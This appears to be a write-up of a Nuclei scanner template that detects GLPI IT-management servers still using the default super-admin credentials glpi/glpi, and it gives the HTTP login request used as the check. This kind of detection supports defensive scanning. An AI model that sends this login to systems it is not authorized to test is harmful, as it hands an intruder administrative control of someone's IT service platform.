# Nuclei Template: GLPI Default Login
**Template ID:** glpi-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`glpi-default-login.yaml`)

## Vulnerability Information & PoC

## Description
GLPI default login credentials were discovered. GLPI is an ITSM software tool that helps you plan and manage IT changes. This template checks if a default super admin account (glpi/glpi) is enabled.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /front/login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}

{{name}}={{user}}&{{password}}={{pass}}&auth=local&submit=Submit&_glpi_csrf_token={{token}}
```

## References
- https://glpi-project.org/
